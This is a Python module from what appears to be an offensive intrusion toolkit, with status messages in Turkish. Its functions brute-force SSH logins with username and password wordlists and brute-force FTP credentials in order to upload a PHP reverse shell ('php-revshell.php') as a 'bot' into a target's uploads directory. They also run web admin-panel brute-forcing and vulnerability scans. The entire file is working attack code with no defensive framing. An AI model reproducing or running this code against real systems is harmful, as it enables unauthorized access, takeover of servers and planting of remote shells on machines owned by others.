# modules/attack.py

from modules.web_bruteforce import run_admin_brute
from modules.web_scanner import scan_vulnerabilities
from modules.bot import ssh_connect, open_ports_ssh, upload_bot_ftp
from wordlists.usernames import usernames
from wordlists.passwords import passwords

def perform_ssh_bruteforce(target):
    print("[🔐] SSH brute-force başlatılıyor...")
    for user in usernames:
        for pw in passwords:
            client = ssh_connect(target, user, pw)
            if client:
                print(f"[✅] Başarılı SSH Giriş: {user}:{pw}")
                return client, user, pw
    print("[❌] SSH brute-force başarısız.")
    return None, None, None

def perform_ftp_upload(target):
    print("[📤] FTP bot yükleme başlatılıyor...")
    for user in usernames:
        for pw in passwords:
            success = upload_bot_ftp(target, user, pw, "php-revshell.php", "uploads/php-revshell.php")
            if success:
                print(f"[✅] FTP ile bot yüklendi: {user}:{pw}")
                return f"{user}:{pw}"
    print("[❌] FTP yükleme başarısız.")
    return None

def perform_web_attacks(target):
    print("[🌐] Web saldırıları başlatılıyor...")
    admin_result = run_admin_brute(target)
    vuln_result = scan_vulnerabilities(target)
    return admin_result, vuln_result
